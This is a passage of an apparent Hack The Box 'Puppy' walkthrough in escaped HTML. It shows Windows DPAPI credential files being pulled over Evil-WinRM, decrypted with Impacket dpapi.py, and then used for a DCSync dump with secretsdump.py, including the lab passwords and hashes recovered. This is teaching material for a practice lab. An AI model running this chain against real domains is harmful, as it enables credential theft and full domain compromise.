&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">È&lt;/span> &lt;span class="n">https&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="p">//&lt;/span>&lt;span class="n">book&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">hacktricks&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">wiki&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">en&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="nb">windows-hardening&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="nb">windows-local&lt;/span>&lt;span class="n">-privilege-escalation&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">html&lt;/span>&lt;span class="c">#dpapi&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">CredFile&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">steph&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">cooper&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">AppData&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Local&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Microsoft&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Credentials&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">DFBE70A7E5CC19A398EBF1B96859CE5D&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Description&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="n">Local&lt;/span> &lt;span class="n">Credential&lt;/span> &lt;span class="n">Data&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">MasterKey&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="n">556a2412&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="mf">1275&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="n">4ccf-b721-e6a0b4f90407&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Accessed&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="mf">3&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">8&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">2025&lt;/span> &lt;span class="mf">8&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">14&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">09&lt;/span> &lt;span class="n">AM&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Modified&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="mf">3&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">8&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">2025&lt;/span> &lt;span class="mf">8&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">14&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">09&lt;/span> &lt;span class="n">AM&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Size&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="mf">11068&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">=================================================================================================&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">CredFile&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="n">C:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Users&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">steph&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">cooper&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">AppData&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Roaming&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Microsoft&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Credentials&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">C8D69EBE9A43E9DEBF6B5FBD48B521B9&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Description&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="n">Enterprise&lt;/span> &lt;span class="n">Credential&lt;/span> &lt;span class="n">Data&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">MasterKey&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="n">556a2412&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="mf">1275&lt;/span>&lt;span class="p">-&lt;/span>&lt;span class="n">4ccf-b721-e6a0b4f90407&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Accessed&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="mf">3&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">8&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">2025&lt;/span> &lt;span class="mf">7&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">54&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">29&lt;/span> &lt;span class="n">AM&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Modified&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="mf">3&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">8&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">2025&lt;/span> &lt;span class="mf">7&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">54&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">29&lt;/span> &lt;span class="n">AM&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Size&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="mf">414&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">=================================================================================================&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">È&lt;/span> &lt;span class="n">Follow&lt;/span> &lt;span class="n">the&lt;/span> &lt;span class="n">provided&lt;/span> &lt;span class="n">link&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">further&lt;/span> &lt;span class="n">instructions&lt;/span> &lt;span class="k">in&lt;/span> &lt;span class="n">how&lt;/span> &lt;span class="n">to&lt;/span> &lt;span class="n">decrypt&lt;/span> &lt;span class="n">the&lt;/span> &lt;span class="n">creds&lt;/span> &lt;span class="n">file&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="n">SNIP&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Master key :&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-zsh" data-lang="zsh">&lt;span class="line">&lt;span class="cl">*Evil-WinRM* PS C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\s&lt;/span>teph.cooper&lt;span class="se">\A&lt;/span>ppData&lt;span class="se">\R&lt;/span>oaming&lt;span class="se">\M&lt;/span>icrosoft&lt;span class="se">\P&lt;/span>rotect&lt;span class="se">\S&lt;/span>-1-5-21-1487982659-1829050783-2281216199-1107&amp;gt; copy 556a2412-1275-4ccf-b721-e6a0b4f90407 C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\s&lt;/span>teph.cooper&lt;span class="se">\D&lt;/span>esktop
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">*Evil-WinRM* PS C:&lt;span class="se">\U&lt;/span>Sers&lt;span class="se">\s&lt;/span>teph.cooper&lt;span class="se">\D&lt;/span>esktop&amp;gt; attrib -h -s 556a2412-1275-4ccf-b721-e6a0b4f90407
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">*Evil-WinRM* PS C:&lt;span class="se">\U&lt;/span>Sers&lt;span class="se">\s&lt;/span>teph.cooper&lt;span class="se">\D&lt;/span>esktop&amp;gt; download 556a2412-1275-4ccf-b721-e6a0b4f90407
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Info: Downloading C:&lt;span class="se">\U&lt;/span>Sers&lt;span class="se">\s&lt;/span>teph.cooper&lt;span class="se">\D&lt;/span>esktop&lt;span class="se">\5&lt;/span>56a2412-1275-4ccf-b721-e6a0b4f90407 to 556a2412-1275-4ccf-b721-e6a0b4f90407
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Info: Download successful!
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Credential File :&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-zsh" data-lang="zsh">&lt;span class="line">&lt;span class="cl">*Evil-WinRM* PS C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\s&lt;/span>teph.cooper&lt;span class="se">\A&lt;/span>ppData&lt;span class="se">\R&lt;/span>oaming&lt;span class="se">\M&lt;/span>icrosoft&lt;span class="se">\C&lt;/span>redentials&amp;gt; attrib -h -s C8D69EBE9A43E9DEBF6B5FBD48B521B9
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">*Evil-WinRM* PS C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\s&lt;/span>teph.cooper&lt;span class="se">\A&lt;/span>ppData&lt;span class="se">\R&lt;/span>oaming&lt;span class="se">\M&lt;/span>icrosoft&lt;span class="se">\C&lt;/span>redentials&amp;gt; cp C8D69EBE9A43E9DEBF6B5FBD48B521B9 C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\s&lt;/span>teph.cooper&lt;span class="se">\D&lt;/span>esktop
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">*Evil-WinRM* PS C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\s&lt;/span>teph.cooper&lt;span class="se">\A&lt;/span>ppData&lt;span class="se">\R&lt;/span>oaming&lt;span class="se">\M&lt;/span>icrosoft&lt;span class="se">\C&lt;/span>redentials&amp;gt; &lt;span class="nb">cd&lt;/span> C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\s&lt;/span>teph.cooper&lt;span class="se">\D&lt;/span>esktop
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">*Evil-WinRM* PS C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\s&lt;/span>teph.cooper&lt;span class="se">\D&lt;/span>esktop&amp;gt; download C8D69EBE9A43E9DEBF6B5FBD48B521B9
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Info: Downloading C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\s&lt;/span>teph.cooper&lt;span class="se">\D&lt;/span>esktop&lt;span class="se">\C&lt;/span>8D69EBE9A43E9DEBF6B5FBD48B521B9 to C8D69EBE9A43E9DEBF6B5FBD48B521B9
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Info: Download successful!
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>The first step involves decrypting the &lt;strong>Master Key&lt;/strong> using the &lt;code>dpapi.py&lt;/code> tool. The Master Key is encrypted and tied to the user&amp;rsquo;s &lt;code>SID&lt;/code> and password.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-zsh" data-lang="zsh">&lt;span class="line">&lt;span class="cl">dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password &lt;span class="s1">&amp;#39;ChefSteph2025!&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Impacket v0.11.0 - Copyright &lt;span class="m">2023&lt;/span> Fortra
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>MASTERKEYFILE&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Version : &lt;span class="m">2&lt;/span> &lt;span class="o">(&lt;/span>2&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Guid : 556a2412-1275-4ccf-b721-e6a0b4f90407
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Flags : &lt;span class="m">0&lt;/span> &lt;span class="o">(&lt;/span>0&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Policy : 4ccf1275 &lt;span class="o">(&lt;/span>1288639093&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">MasterKeyLen: &lt;span class="m">00000088&lt;/span> &lt;span class="o">(&lt;/span>136&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">BackupKeyLen: &lt;span class="m">00000068&lt;/span> &lt;span class="o">(&lt;/span>104&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">CredHistLen : &lt;span class="m">00000000&lt;/span> &lt;span class="o">(&lt;/span>0&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">DomainKeyLen: &lt;span class="m">00000174&lt;/span> &lt;span class="o">(&lt;/span>372&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Decrypted key with User Key &lt;span class="o">(&lt;/span>MD4 protected&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Once the Master Key is decrypted, it can be used to decrypt stored credentials. This command decrypts the credential file using the extracted Master Key.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-zsh" data-lang="zsh">&lt;span class="line">&lt;span class="cl"> dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Impacket v0.11.0 - Copyright &lt;span class="m">2023&lt;/span> Fortra
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>CREDENTIAL&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">LastWritten : 2025-03-08 15:54:29
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Flags : 0x00000030 &lt;span class="o">(&lt;/span>CRED_FLAGS_REQUIRE_CONFIRMATION&lt;span class="p">|&lt;/span>CRED_FLAGS_WILDCARD_MATCH&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Persist : 0x00000003 &lt;span class="o">(&lt;/span>CRED_PERSIST_ENTERPRISE&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Type : 0x00000002 &lt;span class="o">(&lt;/span>CRED_TYPE_DOMAIN_PASSWORD&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Target : Domain:target&lt;span class="o">=&lt;/span>PUPPY.HTB
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Description :
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Unknown :
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Username : steph.cooper_adm
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Unknown : FivethChipOnItsWay2025!
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>Bloodhound&lt;/code> shows that this user have DCSync Right over the whole domain.&lt;/p>
&lt;p>&lt;img src="https://r4z1o.github.io/p/puppy-htb-writeup/Puppy1.png"
width="800"
height="290"
srcset="https://r4z1o.github.io/p/puppy-htb-writeup/Puppy1_hu_9fe29030b33c4771.png 480w, https://r4z1o.github.io/p/puppy-htb-writeup/Puppy1_hu_d417acf02d38ccb6.png 1024w"
loading="lazy"
alt=" "
class="gallery-image"
data-flex-grow="275"
data-flex-basis="662px"
>&lt;/p>
&lt;p>Now let&amp;rsquo;s DCsync using &lt;code>secretsdump.py&lt;/code> :&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;span class="lnt">52
&lt;/span>&lt;span class="lnt">53
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-zsh" data-lang="zsh">&lt;span class="line">&lt;span class="cl">sudo secretsdump.py &lt;span class="s2">&amp;#34;puppy.htb/steph.cooper_adm:FivethChipOnItsWay2025\!&amp;#34;&lt;/span>@&lt;span class="s2">&amp;#34;dc.puppy.htb&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>sudo&lt;span class="o">]&lt;/span> password &lt;span class="k">for&lt;/span> razio:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Impacket v0.11.0 - Copyright &lt;span class="m">2023&lt;/span> Fortra
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Target system bootKey: 0xa943f13896e3e21f6c4100c7da9895a6
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Dumping &lt;span class="nb">local&lt;/span> SAM hashes &lt;span class="o">(&lt;/span>uid:rid:lmhash:nthash&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:9c541c389e2904b9b112f599fd6b333d:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> SAM hashes extraction &lt;span class="k">for&lt;/span> user WDAGUtilityAccount failed. The account doesn&lt;span class="s1">&amp;#39;t have hash information.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[*] Dumping cached domain logon information (domain/username:hash)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[*] Dumping LSA Secrets
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[*] $MACHINE.ACC
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">PUPPY\DC$:aes256-cts-hmac-sha1-96:f4f395e28f0933cac28e02947bc68ee11b744ee32b6452dbf795d9ec85ebda45
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">PUPPY\DC$:aes128-cts-hmac-sha1-96:4d596c7c83be8cd71563307e496d8c30
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">PUPPY\DC$:des-cbc-md5:54e9a11619f8b9b5
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">PUPPY\DC$:plain_password_hex:84880c04e892448b6419dda6b840df09465ffda259692f44c2b3598d8f6b9bc1b0bc37b17528d18a1e10704932997674cbe6b89fd8256d5dfeaa306dc59f15c1834c9ddd333af63b249952730bf256c3afb34a9cc54320960e7b3783746ffa1a1528c77faa352a82c13d7c762c34c6f95b4bbe04f9db6164929f9df32b953f0b419fbec89e2ecb268ddcccb4324a969a1997ae3c375cc865772baa8c249589e1757c7c36a47775d2fc39e566483d0fcd48e29e6a384dc668228186a2196e48c7d1a8dbe6b52fc2e1392eb92d100c46277e1b2f43d5f2b188728a3e6e5f03582a9632da8acfc4d992899f3b64fe120e13
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">PUPPY\DC$:aad3b435b51404eeaad3b435b51404ee:d5047916131e6ba897f975fc5f19c8df:::
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[*] DPAPI_SYSTEM
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">dpapi_machinekey:0xc21ea457ed3d6fd425344b3a5ca40769f14296a3
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">dpapi_userkey:0xcb6a80b44ae9bdd7f368fb674498d265d50e29bf
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[*] NL$KM
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> 0000 DD 1B A5 A0 33 E7 A0 56 1C 3F C3 F5 86 31 BA 09 ....3..V.?...1..
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> 0010 1A C4 D4 6A 3C 2A FA 15 26 06 3B 93 E0 66 0F 7A ...j&amp;lt;*..&amp;amp;.;..f.z
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> 0020 02 9A C7 2E 52 79 C1 57 D9 0C D3 F6 17 79 EF 3F ....Ry.W.....y.?
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> 0030 75 88 A3 99 C7 E0 2B 27 56 95 5C 6B 85 81 D0 ED u.....+&amp;#39;&lt;/span>V.&lt;span class="se">\k&lt;/span>....
